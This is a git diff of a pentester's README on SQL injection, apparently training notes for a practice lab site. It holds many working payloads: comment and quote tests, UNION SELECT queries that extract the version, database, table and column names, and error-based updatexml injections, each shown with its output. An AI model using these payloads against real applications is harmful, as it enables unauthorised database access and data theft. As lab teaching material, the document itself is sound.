@@ -1,9 +1,12 @@
-# SQL Injections for Pentesters
+# SQL Injections for Pentesters :syringe:
 
-by: @Anake    (Anakein)
+by: Eduardo Barbosa (@Anake)  :alien::smiling_imp::boom: 
+
 email: anakein [@] protonmail [dot] ch
 
 Hello my friends, this is my repo about sql injections. 
+
+Thanks for all: Zenodermus Javanicus, @zc00l, @LowFuel 
 
 References:
 
@@ -16,17 +19,17 @@ LAB: http://leettime.net/sqlninja.com/index.php
 
 
 ```
-select * from table_name where id=23
+select * from table_name where id=1337
 
-select * from table_name where id='23'
+select * from table_name where id='1337'
 
-select * from table_name where id="23"
+select * from table_name where id="1337"
 
-select * from table_name where id=(23)
+select * from table_name where id=(1337)
 
-select * from table_name where id=('23')
+select * from table_name where id=('1337')
 
-select * from table_name where id=("23")
+select * from table_name where id=("1337")
 
 
 +--------+-----------------------------------+
@@ -42,7 +45,37 @@ select * from table_name where id=("23")
 
 ```
 
-#### Information IMPORTANT
+You need realize several tests, really this is tense but is necessary
+
+```
++----------------------------------------------------------------+------------------------------------------------------------------------------+
+|                     Injection                                  |             If it gives same Output as 23 was giving then                    |
++----------------------------------------------------------------+------------------------------------------------------------------------------+
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1--     | Its intiger type injection and `--` can be used as comment                   |
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'--    | Its Single quote type injection and '--' can be used as comment              | 
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1"--    | Its Double quote type injection and '--' can be used as comment              |
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1)--    | Its intiger type with bracket injection and '--' can be used as comment      |
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1')--   | Its Single quote with bracket type injection and '--' can be used as comment |
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1")--   | Its Double quote with bracket type injection and '--' can be used as comment |
++----------------------------------------------------------------+------------------------------------------------------------------------------+
+
+```
+
+so as i showed above test for '--' type comment in the same manner you can check for all commenting types and the one which gives same output as giving with "http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1" then that can help you understand the type of internal query alongwith the comment that you can use.
+
+#### :heavy_exclamation_mark: Rules :heavy_exclamation_mark:
+
+ Any time anywhere or any application where ever and whenever you are injecting there are following three basic rules of injecting!
+ 
+[1]. Balance ⚖️
+
+[2]. Inject :syringe:
+
+[3]. Commenting 💬
+
+![rules_for_injection](https://raw.githubusercontent.com/0xC2-0xC2/blackhat_sql_injections/master/injection_.jpg)
+
+#### :heavy_exclamation_mark: Information IMPORTANT :heavy_exclamation_mark:
 Remember whenever the input is enclosed with single quotes only single quote with input will create error.
 When input is enlcosed by double quotes a double qoute with input will give error.
 When Input is not enlcosed with anything single quote and double quote both will give error.
@@ -125,13 +158,31 @@ OR
 
 Then the following codes will extract the databases'name, tables'name, columns'name.
 
+#### :heavy_exclamation_mark: Various methods to make a QUERY INVALID  - Remember to use URL Encoded. :heavy_exclamation_mark:
+
+```
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' and 0 union select 1,@@version,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' and false union select 1,@@version,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=-1' union select 1,@@version,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1000000' union select 1,@@version,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=null' union select 1,@@version,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' && 0 union select 1,@@version,3--+
+
+```
+
 #### Extract DATABASE NAME
 
 `1' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c),3+fRoM+information_schema.schemata%23`
 
 OUTPUT:     leettime_761wHole
 
-#### Extract TABLES NAME
+#### Extract TABLES NAME  
 
 `1' UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C),3+fRoM+information_schema.tables+wHeRe+table_schema=database()%23`
 
@@ -226,10 +277,3 @@ OUTPUT: Username is : leettime_761wHole
 `AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)--`
 
 OUTPUT: Error While Selection process : XPATH syntax error: '~5.6.44-cll-lve~'
-
-
-
-
-
-
-Credits: @zc00l
